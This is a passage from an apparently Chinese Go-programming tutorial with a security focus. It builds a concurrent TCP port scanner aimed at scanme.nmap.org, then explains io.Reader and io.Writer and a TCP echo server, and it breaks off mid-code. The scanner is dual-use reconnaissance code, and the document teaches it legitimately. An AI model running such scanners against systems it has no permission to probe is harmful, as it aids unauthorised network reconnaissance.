title="3. 执行非并发扫描"></a>3. 执行非并发扫描</h4><p>上面的例子中我们是进行单个扫描，没有同时扫描，这将浪费很多的时间，于是我们需要使用<code>gorountine</code>提高扫描器的速度，其数量受到系统处理能力和可用内存的限制</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">1024</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(j <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">address := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>,j)</span><br><span class="line">conn,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,address)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//端口已关闭或者过滤</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>,j)</span><br><span class="line">&#125;(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们写出这样的代码的时候，程序几乎是立马就退出了，因为运行的代码会为每一个连接启动一个<code>gorountine,</code>而主<code>gorountine</code>不知道要等待连接发生，代码会在for循环完成之后立刻退出，这可能比端口之间的网络包交换还要快，无法直接获得准确结果。所以我们需要使用<code>sync</code>包中的<code>WaitGroup</code>方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br></pre></td></tr></table></figure><p>创建<code>WaitGroup</code>以后，可以调用一些方法</p><ol><li>Add(int)，他将按所提供的数字递增内部的计算器</li><li>Done() 将计算器减一</li><li>Wait() 会阻止其中调用它的<code>gorountine</code>的执行，并且在内部计算器到达0之前不允许进一步执行。</li></ol><h4 id="4-1-使用WaitGroup进行同步扫描"><a href="#4-1-使用WaitGroup进行同步扫描" class="headerlink" title="4. 1 使用WaitGroup进行同步扫描"></a>4. 1 使用WaitGroup进行同步扫描</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">1024</span>; i++ &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(j <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line">address := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>,j)</span><br><span class="line">conn,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,address)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//端口已关闭或者过滤</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>,j)</span><br><span class="line">&#125;(i)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此版本中，创建了<code>WaitGroup()</code>用作同步计算器，每次创建<code>gorounine</code>扫描端口的时候，都可以通过<code>wg.Add(1)</code>递增计数器，然后使用<code>Done()递减</code>，在<code>main</code>中调用<code>wg.Wait()</code>将阻塞所有进程直到计数器为0为止</p><h4 id="4-2-工人池–-gt-多通道通信"><a href="#4-2-工人池–-gt-多通道通信" class="headerlink" title="4.2 工人池–&gt;多通道通信"></a>4.2 工人池–&gt;多通道通信</h4><p>为了避免结果不一致，我们需要使用<code>gorountine</code>池管理正在进行的并发工作，使用<code>for</code>循环创建一定数量的工人<code>gorountine</code>作为资源池，然后再<code>main</code>线程中使用通道提供工作</p><p>首先，我们创建一个新程序，程序有100个worker，使用一个<code>int</code>通道将他们打印到屏幕上，继续使用<code>WaitGroup</code>阻塞执行。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(ports <span class="keyword">chan</span> <span class="type">int</span>,wg *sync.WaitGroup)</span></span>  &#123;</span><br><span class="line"><span class="keyword">for</span> p := <span class="keyword">range</span> ports&#123;</span><br><span class="line">fmt.Println(p)</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ports := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span> ,<span class="number">100</span>)</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt;=<span class="built_in">cap</span>(ports); i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(ports,&amp;wg)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line">ports &lt;- i</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line"><span class="built_in">close</span>(ports)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们再使用了make去创建了一个通道，在此处int 值等于 100，这样就可以对该通道进行缓冲，这也意味着 可以在不等待接收器读取数据的情况下，向其发送数据。缓冲通道可以维护多个生产者和消费者的问题，将通道容量设为100意味着发送被阻止之前，可以容纳100个数据项，这样做可以提升性能，因为允许所有的工人立即启动</p><blockquote><p>在上面的例子中，我们可以很清楚的看见，数字并不是按照顺序打印的，因为端口扫描器不回去检查他们的顺序，我们可以使用单独的线程扫描器将扫描结果传回主线程，以便在打印之前对端口进行一个排序，这样做的好处是，可以消除对<code>WaitGroup</code>的依赖</p></blockquote><p>接下来进行修改，使用多通道进行扫描</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(ports,results <span class="keyword">chan</span> <span class="type">int</span>)</span></span>  &#123;</span><br><span class="line"><span class="keyword">for</span> p := <span class="keyword">range</span> ports&#123;</span><br><span class="line">address := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>,p)</span><br><span class="line">conn,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,address)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">results &lt;- <span class="number">0</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">results &lt;- p</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ports := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span> ,<span class="number">100</span>)</span><br><span class="line">results := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"><span class="keyword">var</span> openports  [] <span class="type">int</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt;=<span class="built_in">cap</span>(ports); i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(ports,results)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">ports &lt;- i</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">port := &lt;-results</span><br><span class="line"><span class="keyword">if</span> port != <span class="number">0</span> &#123;</span><br><span class="line">openports = <span class="built_in">append</span>(openports,port)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(ports)</span><br><span class="line"><span class="built_in">close</span>(results)</span><br><span class="line">sort.Ints(openports)</span><br><span class="line"><span class="keyword">for</span> _,port := <span class="keyword">range</span> openports&#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d opend\n&quot;</span>,port)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个高效的扫描器需要花时间去处理工人的数量，数量越多，程序执行的越快，但是当工人数量过多的时候，结果就会变得不可靠</p><h3 id="0x04-构造TCP代理"><a href="#0x04-构造TCP代理" class="headerlink" title="0x04 构造TCP代理"></a>0x04 构造TCP代理</h3><h4 id="1-使用io-Reader和io-writer"><a href="#1-使用io-Reader和io-writer" class="headerlink" title="1. 使用io.Reader和io.writer"></a>1. 使用io.Reader和io.writer</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Reader <span class="keyword">interface</span> &#123;</span><br><span class="line">Read(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Writerer <span class="keyword">interface</span> &#123;</span><br><span class="line">Writer(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在GO语言中，以上两种数据类型被定义为接口，这意味着他们不能直接被实例化,该抽象方法必须在某种数据类型上得到实现才能运用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span>  FooReader <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="keyword">type</span>  FooWriter <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolreader * FooReader)</span></span> Read(p [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">//从某处读取一些数据</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;ssssss&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(s),<span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolWriter * FooWriter)</span></span> Write(p [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">//从某处写入一些数据</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;ssssss&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(s),<span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面看个例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//从标准输入 stdin 读取数据 io.Reader</span></span><br><span class="line"><span class="keyword">type</span>  FooReader <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="comment">//定义一个 写入标准输出 stdout的 io.Writer</span></span><br><span class="line"><span class="keyword">type</span>  FooWriter <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolReader * FooReader)</span></span> Read(b [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;in &gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> os.Stdin.Read(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolWriter * FooWriter)</span></span> Write(b [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;out &gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> os.Stdout.Write(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//实例化 Reader和writer</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">reader FooReader</span><br><span class="line">writer FooWriter</span><br><span class="line">)</span><br><span class="line"><span class="comment">//创建缓冲区已保存输入/输出</span></span><br><span class="line">input := <span class="built_in">make</span>([] <span class="type">byte</span>,<span class="number">4096</span>)</span><br><span class="line"><span class="comment">//使用 reader读取</span></span><br><span class="line">s,err := reader.Read(input)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;unable to read data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Read %d bytes from stdin\n&quot;</span>,s)</span><br><span class="line"><span class="comment">//使用writer写出</span></span><br><span class="line">s,err = writer.Write(input)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;unable to write data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;wrote %d bytes to stdout\n&quot;</span>,s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将Reader 复制到Writer是一种非常常见的模式，于是官方提供了一个<code>io.Copy()</code>用于简化操作</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//从标准输入 stdin 读取数据 io.Reader</span></span><br><span class="line"><span class="keyword">type</span>  FooReader <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="comment">//定义一个 写入标准输出 stdout的 io.Writer</span></span><br><span class="line"><span class="keyword">type</span>  FooWriter <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolReader * FooReader)</span></span> Read(b [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;in &gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> os.Stdin.Read(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolWriter * FooWriter)</span></span> Write(b [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;out &gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> os.Stdout.Write(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//实例化 Reader和writer</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">reader FooReader</span><br><span class="line">writer FooWriter</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> _, err := io.Copy(&amp;writer, &amp;reader); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;发生了错误&quot;</span> )</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了io.Copy 只需要 处理先读后写的过程，而无需关注其他细节。</p><h4 id="2-创建回显服务器"><a href="#2-创建回显服务器" class="headerlink" title="2. 创建回显服务器"></a>2. 创建回显服务器</h4><p>按照大多数语言的习惯，首先需要一个回显服务器，以学习如何再套接字中读写数据，为此，需要用到<code>net.Conn</code></p><p>创建Conn实例以后，可以通过TCP套接字接受和发送数据，不过TCP服务器不能简单的创造一个连接，连接必须由客户端发起建立。</p><p>在Go中可以使用<code>net.Listen(network,address string)</code>在特定端口打开TCP监听器，客户端连接后，可以使用<code>Accept()</code>创建一个Conn对象，可以用于接受和发送数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echo</span><span class="params">(conn net.Conn)</span></span>  &#123;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line"><span class="comment">//创建一个缓冲区来接受储存的数据</span></span><br><span class="line">b := <span class="built_in">make</span>([]<span class="type">byte</span>,<span class="number">512</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;<span class="comment">//进行无线循环</span></span><br><span class="line"><span class="comment">//通过conn.Read接受数据到缓冲区</span></span><br><span class="line">size,err := conn.Read(b[<span class="number">0</span>:])</span><br><span class="line"><span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Client disconnected&quot;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Unexpected error&quot;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">log.Println(<span class="string">&quot;Received %d bytes : %s\n&quot;</span>,size,<span class="type">string</span>(b))</span><br><span class="line"><span class="comment">//通过write 发送数据</span></span><br><span class="line">log.Println(<span class="string">&quot;Writing Data&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> _,err :=conn.Write(b[<span class="number">0</span>:size]);err !=<span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;unable to write data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="comment">//在所有接口上绑定 TCP端口 20080</span></span><br><span class="line">listener,err := net.Listen(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;:20080&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to bind to tcp&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">log.Println(<span class="string">&quot;Listening on 0.0.0.0:20080&quot;</span>)</span><br><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line"><span class="comment">//等待连接，在已经建立连接上创捷 net.Conn</span></span><br><span class="line">conn,err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to accept connection&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理连接，使用gorountine并发</span></span><br><span class="line"><span class="keyword">go</span> echo(conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中Conn既是<code>Reader</code>也是<code>Writer</code>，实现了<code>Read[]byte</code>，和Write([] byte)方法</p><p>之后，使用<code>gorountine</code>使其成为并发调用，以便在等待处理函数完成时，其他连接不会被阻塞</p><p>当我们使用<code>telnet</code>进行一个连接的时候</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220220114739.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220220114831.png"></p><p>可以看见回显服务器将客户端发送给它的内容完全重复的发送给客户端</p><h4 id="3-创建缓冲带的监听器来改进代码"><a href="#3-创建缓冲带的监听器来改进代码" class="headerlink" title="3. 创建缓冲带的监听器来改进代码"></a>3. 创建缓冲带的监听器来改进代码</h4><p>上面的例子依赖相当低级的函数调用，且缓冲区跟踪重复读写，其运行过程容易出错。可以使用<code>bufio</code>包，其中也包含了<code>Reader</code>和<code>Writer</code>，我们稍微改进一下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echo2</span><span class="params">(conn net.Conn)</span></span>  &#123;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line"><span 